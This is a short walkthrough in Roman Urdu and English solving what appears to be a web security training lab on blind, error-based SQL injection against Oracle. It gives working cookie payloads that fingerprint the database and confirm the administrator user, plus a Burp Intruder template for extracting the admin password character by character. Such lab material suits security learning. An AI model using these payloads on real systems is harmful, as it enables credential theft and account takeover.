### Step-by-Step Practical Solution
**Step 1: Database Aur Error Test Karna**
 * TrackingId cookie ke aage single quote ' lagayein. Agar **500 Internal Server Error** aaye, toh confirm hai ke error trigger ho raha hai.
 * Oracle database verify karne ke liye cookie mein yeh inject karein:
   ```text
   xyz'||(SELECT '' FROM dual)||'
   
   ```
 * Agar error khatam ho kar **200 OK** aaye, toh confirm hai ke yeh **Oracle** database hai.
**Step 2: User 'administrator' Ki Maujoodgi Check Karna**
 * User check karne ke liye yeh payload bhejain:
   ```text
   xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
   
   ```
 * Agar **500 Internal Server Error** aaye, toh moves clear hain ke administrator user exist karta hai.
**Step 3: Password Characters Extract Karna (Burp Intruder / Script)**
Is lab mein **Condition True = 500 Internal Server Error** aur **Condition False = 200 OK** hota hai.
 * **Burp Intruder (Cluster Bomb) Payload:**
   ```text
   TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
   
   ```
 * **Positions & Payloads:**
   * **Payload 1 (Position):** Numbers 1 se 20.
   * **Payload 2 (Character):** Simple List (a-z, 0-9).
 * **Results Filter:** Attack run karne ke baad Intruder window mein **Status** column par click karke sort karein. **500** status code wali rows aapke sahi characters hongi.
**Step 4: Login & Complete Lab**
 * Tamam 20 positions ke characters ko tarteeb (order) mein milayein.
 * Website ke **My account** page par ja kar username administrator aur nikala gaya password daal kar login karein. Lab solved ho jaye gi!
